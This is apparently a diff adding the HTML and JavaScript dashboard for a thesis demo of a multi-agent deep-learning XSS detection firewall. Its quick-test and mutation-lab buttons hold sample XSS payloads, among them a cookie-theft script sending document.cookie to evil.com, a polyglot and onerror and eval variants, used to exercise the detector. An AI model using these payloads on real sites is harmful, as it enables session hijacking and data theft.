@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GNN-DQN-MAFS XSS Firewall - Live Demo</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" defer></script>
+    <script src="https://cdn.plot.ly/plotly-2.35.2.min.js" defer></script>
+    <style>
+        :root { --primary: #1a5276; --accent: #2e86c1; --safe: #28a745; --blocked: #dc3545; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', system-ui, sans-serif; }
+        .navbar { background: linear-gradient(135deg, var(--primary), var(--accent)) !important; }
+        .hero { background: linear-gradient(135deg, var(--primary), var(--accent)); color: #fff; text-align: center; padding: 2rem 1rem; margin-bottom: 2rem; }
+        .hero .icon { font-size: 3.5rem; }
+        .card { border: none; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+        .result-safe { border-left: 5px solid var(--safe); background: linear-gradient(to right, #d4edda, #fff); }
+        .result-blocked { border-left: 5px solid var(--blocked); background: linear-gradient(to right, #f8d7da, #fff); animation: pulse .5s ease-in-out; }
+        @keyframes pulse { 0%,100%{ box-shadow:0 0 0 0 rgba(220,53,69,.4);} 50%{ box-shadow:0 0 20px 5px rgba(220,53,69,.2);} }
+        .stat-card { text-align: center; padding: 1.2rem; }
+        .stat-card .num { font-size: 2.2rem; font-weight: 700; }
+        .stat-card .lbl { font-size: .8rem; color: #6c757d; text-transform: uppercase; letter-spacing: 1px; }
+        .risk-badge { padding: .25rem .7rem; border-radius: 20px; font-weight: 600; font-size: .78rem; }
+        .risk-critical { background: #dc3545; color: #fff; }
+        .risk-high { background: #e67e22; color: #fff; }
+        .risk-medium { background: #ffc107; color: #333; }
+        .risk-low { background: #28a745; color: #fff; }
+        .quick-btn { margin: .15rem; font-size: .78rem; }
+        .detection-table th { background: var(--primary); color: #fff; font-size: .82rem; }
+        .detection-table td { font-size: .82rem; vertical-align: middle; }
+        .btn-check-main { background: var(--accent); color: #fff; border: none; padding: .7rem 2rem; font-size: 1.05rem; border-radius: 8px; }
+        .btn-check-main:hover { background: var(--primary); color: #fff; }
+        #inputText { min-height: 120px; font-family: Consolas, monospace; font-size: .92rem; }
+        .sys-info { background: var(--primary); color: #fff; padding: 1.2rem; border-radius: 12px; }
+        .pattern-badge { font-size: .72rem; margin: 2px; }
+        .score-bar { height: 8px; border-radius: 4px; }
+        #resultContainer { min-height: 100px; }
+        .waiting-msg { color: #aaa; text-align: center; padding: 3rem 1rem; }
+
+        /* --- MAFS multi-agent tabs --- */
+        .nav-tabs .nav-link { color: #555; font-weight: 600; border-radius: 8px 8px 0 0; }
+        .nav-tabs .nav-link.active { color: var(--primary); border-bottom: 3px solid var(--primary); background: #fff; }
+        .agent-card { background: #fff; border: 1px solid #e0e6ed; border-radius: 10px; padding: .9rem;
+                      box-shadow: 0 1px 6px rgba(0,0,0,.04); transition: transform .15s, box-shadow .15s; }
+        .agent-card:hover { transform: translateY(-2px); box-shadow: 0 4px 14px rgba(0,0,0,.10); }
+        .agent-card .a-id { font-size: .78rem; font-weight: 700; color: #fff; background: var(--primary);
+                            display: inline-block; padding: 2px 8px; border-radius: 12px; }
+        .agent-card .a-vote-yes { color: var(--blocked); }
+        .agent-card .a-vote-no  { color: #aaa; }
+        .agent-card .a-bar { height: 6px; background: #eef2f6; border-radius: 3px; overflow: hidden; margin-top: 6px; }
+        .agent-card .a-bar > div { height: 100%; background: linear-gradient(to right, #fcb02a, #dc3545); }
+        .agent-card.dim { opacity: .55; }
+        .verdict-banner { padding: 14px 18px; border-radius: 10px; font-weight: 700; font-size: 1.05rem; }
+        .verdict-malicious { background: linear-gradient(to right, #f8d7da, #fff); border-left: 5px solid var(--blocked); color: #842029; }
+        .verdict-benign    { background: linear-gradient(to right, #d4edda, #fff); border-left: 5px solid var(--safe);    color: #155724; }
+        .mutation-row { background: #f7f9fc; border-radius: 8px; padding: 10px 14px; margin-bottom: 8px; display: flex;
+                        align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+        .mutation-row .payload { font-family: Consolas, monospace; font-size: .8rem; color: #444;
+                                 background: #fff; border: 1px solid #e0e6ed; padding: 4px 8px; border-radius: 4px;
+                                 max-width: 520px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .gauge { width: 100%; height: 160px; }
+        .adapt-counter { padding: 1.0rem; background: #fff; border-radius: 10px; border: 1px solid #e0e6ed; text-align: center; }
+        .adapt-counter .v { font-size: 2rem; font-weight: 700; }
+        .adapt-counter .l { font-size: .75rem; text-transform: uppercase; letter-spacing: 1px; color: #6c757d; }
+        .epsilon-bar { display: flex; align-items: center; gap: 8px; margin: 4px 0; font-size: .82rem; }
+        .epsilon-bar .lbl { width: 60px; }
+        .epsilon-bar .track { flex: 1; height: 8px; background: #eef2f6; border-radius: 4px; overflow: hidden; }
+        .epsilon-bar .fill { height: 100%; background: linear-gradient(to right, #28a745, #fcb02a); }
+        .drift-banner { padding: 10px 14px; border-radius: 8px; margin-bottom: 10px; font-weight: 600; }
+        .drift-alert  { background: #fff3cd; border-left: 4px solid #fcb02a; color: #856404; }
+        .drift-ok     { background: #d4edda; border-left: 4px solid var(--safe); color: #155724; }
+        .micro-update-item { background: #fff; border: 1px solid #e0e6ed; border-left: 4px solid var(--accent);
+                             border-radius: 6px; padding: 8px 12px; margin-bottom: 6px; font-size: .82rem; }
+    </style>
+</head>
+<body>
+
+<!-- Navbar -->
+<nav class="navbar navbar-dark px-3">
+    <span class="navbar-brand fw-bold"><i class="bi bi-shield-lock-fill me-2"></i>GNN-DQN-MAFS XSS Firewall</span>
+    <span class="text-white-50 small" id="statusBadge"><i class="bi bi-circle-fill text-success me-1"></i>Hybrid Detection Active</span>
+</nav>
+
+<!-- Hero — Thesis identification -->
+<div class="hero">
+    <div class="icon"><i class="bi bi-shield-check"></i></div>
+    <h2 class="mt-2">Cybersecurity framework for Detection and Prevention<br>of Cross-Site Scripting Attacks Using Hybrid Deep Learning Techniques</h2>
+    <p class="mb-0 mt-3 opacity-90" style="font-size:0.95rem;">
+        <strong>Student:</strong> Ali Nafea Yousif
+        &nbsp;&nbsp;|&nbsp;&nbsp;
+        <strong>Supervised By:</strong> Prof. Dr. Ziyad Tariq Mustafa Al-Ta'i
+    </p>
+</div>
+
+<div class="container-fluid px-4">
+
+    <!-- Input + Result Row -->
+    <div class="row g-4 mb-4">
+        <!-- Input -->
+        <div class="col-lg-6">
+            <div class="card p-4 h-100">
+                <h5 class="mb-3"><i class="bi bi-keyboard me-2 text-primary"></i>Input Text</h5>
+                <textarea id="inputText" class="form-control mb-3" placeholder="Enter any text or HTML to check for XSS attacks..."></textarea>
+                <div class="d-flex flex-wrap align-items-center mb-3">
+                    <button class="btn btn-check-main me-2" id="checkBtn" onclick="checkInput()">
+                        <i class="bi bi-shield-check"></i> Check Input
+                    </button>
+                    <button class="btn btn-outline-primary" id="demoBtn" onclick="runDemoSuite()">
+                        <i class="bi bi-play-circle"></i> Run Demo Suite
+                    </button>
+                </div>
+                <div>
+                    <small class="text-muted d-block mb-1">Quick Tests:</small>
+                    <button class="btn btn-sm btn-outline-success quick-btn" onclick="quickTest('Hello World, welcome to our website')">Safe Text</button>
+                    <button class="btn btn-sm btn-outline-danger quick-btn" onclick="quickTest('<script>alert(1)</script>')">XSS Basic</button>
+                    <button class="btn btn-sm btn-outline-danger quick-btn" onclick="quickTest('<script>document.location=\'http://evil.com/?c=\'+document.cookie</script>')">Cookie Theft</button>
+                    <button class="btn btn-sm btn-outline-danger quick-btn" onclick="quickTest('<svg onload=alert(1)>')">SVG Attack</button>
+                    <button class="btn btn-sm btn-outline-danger quick-btn" onclick="quickTest('<img src=x onerror=alert(1)>')">IMG onerror</button>
+                    <button class="btn btn-sm btn-outline-warning quick-btn" onclick="quickTest('eval(atob(\'YWxlcnQoMSk=\'))')">Base64 Eval</button>
+                </div>
+            </div>
+        </div>
+        <!-- Result -->
+        <div class="col-lg-6">
+            <div class="card p-4 h-100">
+                <h5 class="mb-3"><i class="bi bi-clipboard-data me-2 text-primary"></i>Detection Result</h5>
+                <div id="resultContainer">
+                    <div class="waiting-msg">
+                        <i class="bi bi-arrow-left-circle" style="font-size:2rem;"></i>
+                        <p class="mt-2">Enter text and click <strong>Check Input</strong> to see results</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard Stats -->
+    <div class="row g-3 mb-4">
+        <div class="col-6 col-md-3">
+            <div class="card stat-card">
+                <div class="num text-primary" id="statTotal">0</div>
+                <div class="lbl">Total Checks</div>
+            </div>
+        </div>
+        <div class="col-6 col-md-3">
+            <div class="card stat-card">
+                <div class="num text-danger" id="statBlocked">0</div>
+                <div class="lbl">Blocked (XSS)</div>
+            </div>
+        </div>
+        <div class="col-6 col-md-3">
+            <div class="card stat-card">
+                <div class="num text-success" id="statSafe">0</div>
+                <div class="lbl">Safe (Clean)</div>
+            </div>
+        </div>
+        <div class="col-6 col-md-3">
+            <div class="card stat-card">
+                <div class="num text-warning" id="statBlockRate">0%</div>
+                <div class="lbl">Block Rate</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Recent Detections Table -->
+    <div class="card p-4 mb-4">
+        <h5 class="mb-3"><i class="bi bi-clock-history me-2 text-primary"></i>Recent Detections</h5>
+        <div class="table-responsive">
+            <table class="table table-hover detection-table mb-0">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Time</th>
+                        <th>Input</th>
+                        <th>Status</th>
+                        <th>Score</th>
+                        <th>Risk</th>
+                        <th>Method</th>
+                        <th>Latency</th>
+                    </tr>
+                </thead>
+                <tbody id="historyBody">
+                    <tr><td colspan="8" class="text-center text-muted py-4">No detections yet. Try checking some inputs above.</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- ══════════════ Multi-Agent System Analysis (4 Tabs) ══════════════ -->
+    <div class="card p-4 mb-4">
+        <h4 class="mb-1"><i class="bi bi-diagram-3 me-2 text-primary"></i>Multi-Agent System Analysis</h4>
+        <small class="text-muted">10 GNN-DQN agents · MAFS feature selection · self-supervised adaptation</small>
+
+        <ul class="nav nav-tabs mt-3" role="tablist">
+            <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#tab-mafs" type="button">1&nbsp;·&nbsp;MAFS Panel</button></li>
+            <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-mutation" type="button">2&nbsp;·&nbsp;Mutation Lab</button></li>
+            <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-diversity" type="button">3&nbsp;·&nbsp;Diversity Heatmap</button></li>
+            <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#tab-adapt" type="button">4&nbsp;·&nbsp;Adaptive Learning</button></li>
+        </ul>
+
+        <div class="tab-content mt-4">
+
+            <!-- TAB 1 : MAFS Feature Selection Panel -->
+            <div class="tab-pane fade show active" id="tab-mafs">
+                <div class="row g-3 align-items-center mb-3">
+                    <div class="col-md-9">
+                        <input type="text" id="mafsInput" class="form-control"
+                               value="<script>alert(1)</script>"
+                               placeholder="Enter any text to run through the 10-agent MAFS pipeline" />
+                    </div>
+                    <div class="col-md-3">
+                        <button class="btn btn-check-main w-100" onclick="runMafs()">
+                            <i class="bi bi-cpu"></i> Run MAFS
+                        </button>
+                    </div>
+                </div>
+                <div id="mafsVerdict"></div>
+                <div id="mafsAgents" class="row g-3 mt-1"></div>
+                <div id="mafsRegex" class="mt-3"></div>
+            </div>
+
+            <!-- TAB 2 : Adaptive Detection Mutation Lab -->
+            <div class="tab-pane fade" id="tab-mutation">
+                <p class="text-muted small mb-2">
+                    Each button submits a different evasion of the same conceptual attack. The MAFS ensemble
+                    should detect them all; a single rule-based detector typically misses several.
+                </p>
+                <div class="d-flex flex-wrap gap-2 mb-3">
+                    <button class="btn btn-sm btn-outline-secondary" onclick="runMutation('Benign','hello world how are you today')">Benign baseline</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('Script','<script>alert(1)</script>')">Original Script</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('Event handler','<img src=x onerror=alert(1)>')">Event handler</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('JS URL','<a href=&quot;javascript:alert(1)&quot;>click</a>')">JS URL</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('SVG','<svg onload=alert(1)>')">SVG</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('Encoded','%3Cscript%3Ealert(1)%3C/script%3E')">URL-encoded</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('Polyglot','jaVaScRipT:/*-/*`/*\\`/*\'/*&quot;/**/(/* */onerror=alert(1))//')">Polyglot</button>
+                    <button class="btn btn-sm btn-outline-danger"    onclick="runMutation('DOM-based','<input onfocus=eval(&quot;alert(1)&quot;) autofocus>')">DOM-based</button>
+                    <button class="btn btn-sm btn-outline-warning ms-auto" onclick="clearMutationLog()"><i class="bi bi-trash"></i> Clear</button>
+                </div>
+                <div id="mutationLog"></div>
+            </div>
+
+            <!-- TAB 3 : Diversity Heatmap -->
+            <div class="tab-pane fade" id="tab-diversity">
+                <div class="d-flex justify-content-between align-items-center mb-2">
+                    <p class="text-muted small mb-0">
+                        Per-agent active-feature count across a fixed benchmark of 8 attack categories.
+                        Diverse rows ⇒ each agent specialises in different feature regions ⇒ ensemble robustness.
+                    </p>
+                    <button class="btn btn-sm btn-outline-primary" onclick="runDiversity()"><i class="bi bi-arrow-clockwise"></i> Refresh</button>
+                </div>
+                <div id="diversityHeatmap" style="height:480px;"></div>
+                <div id="diversitySummary" class="mt-3 small text-muted"></div>
+            </div>
+
+            <!-- TAB 4 : Adaptive Learning Dashboard -->
+            <div class="tab-pane fade" id="tab-adapt">
+                <p class="text-muted small mb-3">
+                    Self-supervised continual learning. Every prediction feeds the adapter: high-consensus events
+                    become pseudo-labelled experiences; high-entropy events accumulate as drift; the system
+                    issues a micro-update once the drift threshold is reached.
+                </p>
+                <div id="driftBanner" class="drift-banner drift-ok">No drift detected — system in steady state.</div>
+
+                <div class="row g-3 mb-3">
+                    <div class="col-md-3"><div class="adapt-counter"><div class="v text-success" id="cntPseudo">0</div><div class="l">Pseudo-labelled</div></div></div>
+                    <div class="col-md-3"><div class="adapt-counter"><div class="v text-warning" id="cntUncertain">0</div><div class="l">Uncertain</div></div></div>
+                    <div class="col-md-3"><div class="adapt-counter"><div class="v text-danger"  id="cntDrift">0</div><div class="l">Drift counter</div></div></div>
+                    <div class="col-md-3"><div class="adapt-counter"><div class="v text-primary" id="cntUpdates">0</div><div class="l">Micro-updates</div></div></div>
+                </div>
+
+                <div class="row g-3">
+                    <div class="col-md-6">
+                        <h6 class="text-muted mb-2"><i class="bi bi-speedometer2 me-1"></i>Disagreement entropy (recent)</h6>
+                        <div id="entropyGauge" class="gauge"></div>
+                    </div>
+                    <div class="col-md-6">
+                        <h6 class="text-muted mb-2"><i class="bi bi-sliders me-1"></i>Per-agent exploration (ε)</h6>
+                        <div id="epsilonBars"></div>
+                    </div>
+                </div>
+
+                <div class="row g-3 mt-1">
+                    <div class="col-md-6">
+                        <h6 class="text-muted mb-2"><i class="bi bi-clock-history me-1"></i>Recent events</h6>
+                        <div id="recentEvents" style="max-height:230px; overflow:auto;"></div>
+                    </div>
+                    <div class="col-md-6">
+                        <h6 class="text-muted mb-2"><i class="bi bi-lightning me-1"></i>Micro-update log</h6>
+                        <div id="microUpdateLog" style="max-height:230px; overflow:auto;"></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- System Info -->
+    <div class="sys-info mb-4">
+        <div class="row text-center">
+            <div class="col-md-2 col-4 mb-2">
+                <div class="fw-bold fs-5">Hybrid</div>
+                <small class="opacity-75">Detection</small>
+            </div>
+            <div class="col-md-2 col-4 mb-2">
+                <div class="fw-bold fs-5">226/430</div>
+                <small class="opacity-75">Features (GNN)</small>
+            </div>
+            <div class="col-md-2 col-4 mb-2">
+                <div class="fw-bold fs-5">10</div>
+                <small class="opacity-75">DQN Agents</small>
+            </div>
+            <div class="col-md-2 col-4 mb-2">
+                <div class="fw-bold fs-5" id="sysPatterns">56</div>
+                <small class="opacity-75">Pattern Rules</small>
+            </div>
+            <div class="col-md-2 col-4 mb-2">
+                <div class="fw-bold fs-5">&lt;10ms</div>
+                <small class="opacity-75">Avg Latency</small>
+            </div>
+            <div class="col-md-2 col-4 mb-2">
+                <div class="fw-bold fs-5">98%+</div>
+                <small class="opacity-75">Accuracy</small>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<footer class="text-center py-3 text-muted small">
+    GNN-DQN-MAFS XSS Detection System &mdash; Multi-Agent Feature Selection for XSS Detection &mdash; Committee Demo
+</footer>
+
+<script>
+// ── Check Input ──
+async function checkInput() {
+    const text = document.getElementById('inputText').value.trim();
+    if (!text) { alert('Please enter text to check'); return; }
+    const btn = document.getElementById('checkBtn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Checking...';
+    try {
+        const resp = await fetch('/api/check', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({text})
+        });
+        const result = await resp.json();
+        displayResult(result);
+        refreshStats();
+        refreshHistory();
+    } catch (e) { console.error(e); }
+    finally {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="bi bi-shield-check"></i> Check Input';
+    }
+}
+
+// ── Display Result ──
+function displayResult(r) {
+    const c = document.getElementById('resultContainer');
+    const blocked = r.is_xss;
+    const cls = blocked ? 'result-blocked' : 'result-safe';
+    const icon = blocked ? 'bi-shield-x' : 'bi-shield-check';
+    const color = blocked ? '#dc3545' : '#28a745';
+    const label = blocked ? 'BLOCKED - XSS Detected' : 'SAFE - No Threat';
+    const barCls = r.score >= 0.6 ? 'bg-danger' : r.score >= 0.3 ? 'bg-warning' : 'bg-success';
+
+    let patternsHtml = '';
+    if (r.patterns && r.patterns.length > 0) {
+        const badges = r.patterns.map(p => {
+            const col = {critical:'danger',high:'warning',medium:'info',low:'secondary'}[p.severity]||'secondary';
+            return '<span class="badge bg-'+col+' pattern-badge">'+esc(p.name)+' ('+p.severity+')</span>';
+        }).join(' ');
+        patternsHtml = '<hr><strong>Patterns ('+r.patterns.length+'):</strong><div class="mt-1">'+badges+'</div>';
+    }
+
+    c.innerHTML = `
+    <div class="card ${cls} p-4">
+        <div class="text-center mb-3">
+            <i class="bi ${icon}" style="font-size:3rem;color:${color}"></i>
+            <h4 class="${blocked?'text-danger':'text-success'} mt-2 mb-0">${label}</h4>
+        </div>
+        <div class="row mb-2">
+            <div class="col-7">
+                <small class="text-muted">Score</small>
+                <div class="progress mt-1 score-bar"><div class="progress-bar ${barCls}" style="width:${r.score*100}%"></div></div>
+                <strong>${(r.score*100).toFixed(1)}%</strong>
+            </div>
+            <div class="col-5 text-end">
+                <small class="text-muted">Risk Level</small><br>
+                <span class="risk-badge risk-${r.risk_level}">${r.risk_level.toUpperCase()}</span>
+            </div>
+        </div>
+        <hr>
+        <div class="row text-center">
+            <div class="col-4"><small class="text-muted">Method</small><br><strong>${r.method}</strong></div>
+            <div class="col-4"><small class="text-muted">Pattern</small><br><strong>${(r.pattern_score*100).toFixed(1)}%</strong></div>
+            <div class="col-4"><small class="text-muted">ML</small><br><strong>${r.ml_score!==null?(r.ml_score*100).toFixed(1)+'%':'N/A'}</strong></div>
+        </div>
+        ${patternsHtml}
+        <div class="text-end mt-2"><small class="text-muted">${r.elapsed_ms}ms</small></div>
+    </div>`;
+}
+
+// ── Quick Test ──
+function quickTest(payload) {
+    document.getElementById('inputText').value = payload;
+    checkInput();
+}
+
+// ── Run Demo Suite ──
+async function runDemoSuite() {
+    const btn = document.getElementById('demoBtn');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Running 10 tests...';
+    try {
+        await fetch('/api/batch-demo', {method: 'POST'});
+        refreshStats();
+        refreshHistory();
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="bi bi-play-circle"></i> Run Demo Suite';
+    }
+}
+
+// ── Refresh Stats ──
+async function refreshStats() {
+    try {
+        const resp = await fetch('/api/stats');
+        const s = await resp.json();
+        document.getElementById('statTotal').textContent = s.total_checks;
+        document.getElementById('statBlocked').textContent = s.blocked;
+        document.getElementById('statSafe').textContent = s.safe;
+        document.getElementById('statBlockRate').textContent = s.block_rate.toFixed(1) + '%';
+        document.getElementById('sysPatterns').textContent = s.pattern_count;
+    } catch(e) {}
+}
+
+// ── Refresh History ──
+async function refreshHistory() {
+    try {
+        const resp = await fetch('/api/history');
+        const data = await resp.json();
+        const tbody = document.getElementById('historyBody');
+        if (!data.history || data.history.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="8" class="text-center text-muted py-4">No detections yet.</td></tr>';
+            return;
+        }
+        tbody.innerHTML = data.history.slice(0, 30).map((item, i) => {
+            const statusCls = item.is_xss ? 'danger' : 'success';
+            const statusTxt = item.is_xss ? 'BLOCKED' : 'SAFE';
+            const time = item.timestamp.split('T')[1] ? item.timestamp.split('T')[1].split('.')[0] : '';
+            return `<tr>
+                <td>${i+1}</td>
+                <td><small>${time}</small></td>
+                <td><code style="font-size:.75rem">${esc(item.input_preview)}</code></td>
+                <td><span class="badge bg-${statusCls}">${statusTxt}</span></td>
+                <td>${(item.score*100).toFixed(1)}%</td>
+                <td><span class="risk-badge risk-${item.risk_level}">${item.risk_level}</span></td>
+                <td>${item.method}</td>
+                <td><small>${item.elapsed_ms}ms</small></td>
+            </tr>`;
+        }).join('');
+
+        // ── Auto-trigger the Multi-Agent panels on the newest detection ──
+        // When a fresh entry appears (from /api/check or /victim/*), update the
+        // MAFS input field and replay the MAFS pipeline so reviewers see the
+        // ensemble react live, with no button click required.
+        const latest = data.history[0];
+        const sig = latest.timestamp + '|' + latest.input_preview;
+        if (sig !== window._lastDetectionSig) {
+            window._lastDetectionSig = sig;
+            const inp = document.getElementById('mafsInput');
+            const fullText = latest.input_preview.endsWith('...')
+                ? latest.input_preview.slice(0, -3)
+                : latest.input_preview;
+            if (inp && fullText && fullText !== inp.value) {
+                inp.value = fullText;
+                runMafs();              // updates Tab 1 cards
+                refreshAdapterState();  // refreshes Tab 4 panel
+            }
+        }
+    } catch(e) {}
+}
+
+// ── Helpers ──
+function esc(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
+
+// ── Keyboard shortcut ──
+document.getElementById('inputText').addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'Enter') checkInput();
+});
+
+// ── Initial Load ──
+refreshStats();
+refreshHistory();
+// Auto-refresh stats + history every 5 s so /victim/* detections appear here
+setInterval(() => { refreshStats(); refreshHistory(); }, 5000);
+
+// ════════════════════════════════════════════════════════════════════
+// Multi-Agent Tabs : Tab 1 — MAFS Panel
+// ════════════════════════════════════════════════════════════════════
+async function runMafs() {
+    const text = document.getElementById('mafsInput').value.trim();
+    if (!text) return;
+    try {
+        const r = await fetch('/api/agents-verdict', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({text})
+        });
+        const data = await r.json();
+        if (data.error) { alert(data.error); return; }
+        renderMafsResult(data);
+        refreshAdapterState();
+    } catch(e) { console.error(e); }
+}
+
+function renderMafsResult(data) {
+    const m = data.mafs;
+    const v = document.getElementById('mafsVerdict');
+    const cls = m.is_xss ? 'verdict-malicious' : 'verdict-benign';
+    const icon = m.is_xss ? 'bi-shield-x' : 'bi-shield-check';
+    const txt = m.is_xss ? 'MALICIOUS' : 'BENIGN';
+    v.innerHTML = `
+      <div class="verdict-banner ${cls} d-flex align-items-center justify-content-between flex-wrap gap-2">
+        <div><i class="bi ${icon} me-2"></i>${txt}
+          &nbsp;·&nbsp; classifier score <strong>${(m.score*100).toFixed(1)}%</strong>
+          &nbsp;·&nbsp; ensemble votes <strong>${m.active_votes}/10</strong>
+          &nbsp;·&nbsp; selected features <strong>${m.selected_total}/${m.features_total}</strong>
+        </div>
+      </div>`;
+
+    // 10 agent cards
+    const grid = document.getElementById('mafsAgents');
+    grid.innerHTML = m.agents.map(a => {
+        const fill = Math.min(100, a.active_count / Math.max(a.kept_count,1) * 100).toFixed(0);
+        const dim = a.vote === 0 ? 'dim' : '';
+        const voteCls = a.vote === 1 ? 'a-vote-yes' : 'a-vote-no';
+        const voteIcon = a.vote === 1 ? 'bi-check-circle-fill' : 'bi-dash-circle';
+        return `
+          <div class="col-md-3 col-sm-6">
+            <div class="agent-card ${dim}">
+              <div class="d-flex justify-content-between align-items-center">
+                <span class="a-id">Agent ${a.agent_id}</span>
+                <i class="bi ${voteIcon} ${voteCls}" style="font-size:1.2rem"></i>
+              </div>
+              <div class="small text-muted mt-2">features [${a.slice_start}–${a.slice_end}]</div>
+              <div class="d-flex justify-content-between small mt-1">
+                <span>kept <strong>${a.kept_count}</strong>/${a.slice_size}</span>
+                <span>active <strong>${a.active_count}</strong></span>
+              </div>
+              <div class="a-bar"><div style="width:${fill}%"></div></div>
+              <div class="small mt-1">score <code>${a.activation_score.toFixed(4)}</code></div>
+            </div>
+          </div>`;
+    }).join('');
+
+    // Regex baseline comparison
+    const rb = data.regex_baseline;
+    const ae = data.adapter_event || {};
+    document.getElementById('mafsRegex').innerHTML = `
+      <div class="card p-3" style="background:#f7f9fc;">
+        <div class="row g-2 small">
+          <div class="col-md-4">
+            <i class="bi bi-code-slash"></i> <strong>Regex baseline:</strong>
+            ${rb.is_xss ? '<span class="badge bg-danger">flagged</span>' : '<span class="badge bg-secondary">clean</span>'}
+            (matches: ${rb.matches.length})
+          </div>
+          <div class="col-md-4">
+            <i class="bi bi-diagram-3"></i> <strong>MAFS ensemble:</strong>
+            ${m.is_xss ? '<span class="badge bg-danger">malicious</span>' : '<span class="badge bg-success">benign</span>'}
+          </div>
+          <div class="col-md-4">
+            <i class="bi bi-arrow-repeat"></i> <strong>Adapter:</strong>
+            <span class="badge bg-${ae.flag === 'uncertain' ? 'warning' : (ae.flag === 'consensus_xss' ? 'danger' : 'success')}">
+              ${ae.flag || 'n/a'}
+            </span>
+            (entropy ${ae.entropy != null ? ae.entropy : 'n/a'})
+          </div>
+        </div>
+      </div>`;
+}
+
+// ════════════════════════════════════════════════════════════════════
+// Tab 2 — Adaptive Detection / Mutation Lab
+// ════════════════════════════════════════════════════════════════════
+async function runMutation(label, payload) {
+    try {
+        const r = await fetch('/api/agents-verdict', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({text: payload})
+        });
+        const data = await r.json();
+        if (data.error) { alert(data.error); return; }
+        appendMutationRow(label, payload, data);
+        refreshAdapterState();
+    } catch(e) { console.error(e); }
+}
+
+function appendMutationRow(label, payload, data) {
+    const m = data.mafs;
+    const rb = data.regex_baseline;
+    const log = document.getElementById('mutationLog');
+    const ensembleBadge = m.is_xss
+        ? '<span class="badge bg-danger">MAFS: malicious</span>'
+        : '<span class="badge bg-success">MAFS: benign</span>';
+    const regexBadge = rb.is_xss
+        ? '<span class="badge bg-danger">Regex: flagged</span>'
+        : '<span class="badge bg-secondary">Regex: clean</span>';
+    const agreeIcon = (m.is_xss === rb.is_xss)
+        ? '<i class="bi bi-check-circle text-success" title="Both agree"></i>'
+        : '<i class="bi bi-exclamation-triangle text-warning" title="Disagreement — MAFS catches what regex misses"></i>';
+
+    const row = document.createElement('div');
+    row.className = 'mutation-row';
+    row.innerHTML = `
+        <div>
+          <strong>${esc(label)}</strong> ${agreeIcon}
+          <div class="payload" title="${esc(payload)}">${esc(payload)}</div>
+        </div>
+        <div class="d-flex align-items-center gap-2 flex-wrap">
+          ${ensembleBadge} ${regexBadge}
+          <span class="small text-muted">votes ${m.active_votes}/10 · score ${(m.score*100).toFixed(1)}%</span>
+        </div>`;
+    log.prepend(row);
+    while (log.children.length > 12) log.removeChild(log.lastChild);
+}
+
+function clearMutationLog() {
+    document.getElementById('mutationLog').innerHTML = '';
+}
+
+// ════════════════════════════════════════════════════════════════════
+// Tab 3 — Diversity Heatmap
+// ════════════════════════════════════════════════════════════════════
+async function runDiversity() {
+    try {
+        const r = await fetch('/api/diversity-benchmark');
+        const data = await r.json();
+        if (data.error) { alert(data.error); return; }
+        renderDiversity(data.benchmark);
+    } catch(e) { console.error(e); }
+}
+
+function renderDiversity(rows) {
+    if (!rows || !rows.length) return;
+    const labels = rows.map(r => r.label);
+    const z = rows.map(r => r.agent_active);
+    const agentLabels = Array.from({length:10}, (_,i) => 'A' + i);
+
+    const data = [{
+        z, x: agentLabels, y: labels,
+        type: 'heatmap',
+        colorscale: [
+            [0.0, '#ffffff'],
+            [0.3, '#ffe5b4'],
+            [0.6, '#f39c12'],
+            [1.0, '#c0392b']
+        ],
+        hovertemplate: '<b>%{y}</b><br>%{x}<br>active features: %{z}<extra></extra>',
+        showscale: true,
+        colorbar: { title: { text: 'active feats', font: { size: 11 } }, thickness: 12, len: 0.85 }
+    }];
+
+    const layout = {
+        margin: { l: 120, r: 30, t: 30, b: 40 },
+        xaxis: { title: 'Agent', tickfont: { size: 12 } },
+        yaxis: { autorange: 'reversed', tickfont: { size: 12 } },
+        font: { family: 'Segoe UI, system-ui, sans-serif', size: 12 },
